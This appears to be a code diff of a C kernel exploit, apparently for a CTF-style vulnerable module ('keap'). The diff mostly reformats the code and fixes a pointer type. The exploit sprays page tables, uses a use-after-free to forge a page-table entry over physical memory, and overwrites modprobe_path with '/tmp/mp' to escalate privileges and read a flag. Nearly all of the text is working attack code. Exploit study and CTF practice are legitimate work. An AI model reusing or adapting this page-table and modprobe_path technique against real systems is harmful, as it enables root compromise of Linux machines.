@@ -1,14 +1,17 @@
 #include "libs/pwn.h"
-#include <sys/sendfile.h>
 #include <sched.h>
+#include <sys/sendfile.h>
+#include <sys/syscall.h>
 #include <sys/wait.h>
+#include <unistd.h>
 
 /*******************************
  * EXPLOIT                     *
  *******************************/
 
 /*
- * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
+ * inspired by:
+ * https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
  * this version overwrite modprobe for privilige escalation
  */
 
@@ -35,14 +38,13 @@ int win() {
   fd = SYSCHK(open("/tmp/flag", O_RDONLY));
   count = SYSCHK(read(fd, buf, 0x100));
   linfo("flag: %s", buf);
-  SYSCHK(close(fd));
   return count != 0;
 }
 
 #define N_SPRAY 0x400
 #define PTE_SIZE 0x10000
 
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
   void *ptr;
   uint64_t pte;
   char leak[PTE_SIZE] = {0};
@@ -55,8 +57,8 @@ int main(int argc, char* argv[]) {
   lstage("START");
 
   for (int i = 0; i < N_SPRAY; i++)
-    spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
-                    PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+    spray[i] = mmap((void *)(0xdead000000 + i * 0x10000), 0x8000,
+                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 
   linfo("create dangeling ptr");
   ptr = keap_malloc(PTE_SIZE, GFP_KERNEL);
@@ -66,7 +68,7 @@ int main(int argc, char* argv[]) {
   linfo("spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
     for (int j = 0; j < 8; j++)
-      *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;
+      *(uint64_t *)(spray[i] + j * 0x1000) = 0x6fe1be2;
 
 #ifdef DEBUG
   keap_read(ptr, leak, PTE_SIZE);
@@ -84,10 +86,10 @@ int main(int argc, char* argv[]) {
   linfo("find corrupted page");
   uint64_t *vuln = 0;
   uint64_t physbase = 0;
-  for (int i = 0; i < N_SPRAY; i ++) {
+  for (int i = 0; i < N_SPRAY; i++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
-        vuln = (uint64_t*)(spray[i]+j*0x1000);
+      if (*(uint64_t *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
+        vuln = (uint64_t *)(spray[i] + j * 0x1000);
         physbase = (*vuln & ~0xfff);
         break;
       }
@@ -107,7 +109,7 @@ int main(int argc, char* argv[]) {
   // physbase with nokaslr + 0x3000
   uint64_t offset = 0x2401000 + 0x3000;
 
-  pte = 0x8000000000000067|(physbase+(modprobe&~0xfff)-offset);
+  pte = 0x8000000000000067 | (physbase + (modprobe & ~0xfff) - offset);
 
   keap_write(ptr, &pte, 0x8);
 
@@ -117,12 +119,12 @@ int main(int argc, char* argv[]) {
 #endif
 
   // reload pte or sth idk
-  uint64_t old_vuln = vuln;
+  uint64_t *old_vuln = vuln;
   vuln = NULL;
-  for (int i = 0; i < N_SPRAY; i ++) {
+  for (int i = 0; i < N_SPRAY; i++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
-        vuln = (uint64_t*)(spray[i]+j*0x1000);
+      if (*(uint64_t *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
+        vuln = (uint64_t *)(spray[i] + j * 0x1000);
         break;
       }
     }
@@ -132,7 +134,7 @@ int main(int argc, char* argv[]) {
   CHK(vuln == old_vuln);
 
   linfo("overwriting modprobe_path");
-  vuln[(modprobe&0xfff)/8] = *(uint64_t*) "/tmp/mp";
+  vuln[(modprobe & 0xfff) / 8] = *(uint64_t *)"/tmp/mp";
 
 #ifdef DEBUG
   print_hex(vuln, 0x40);
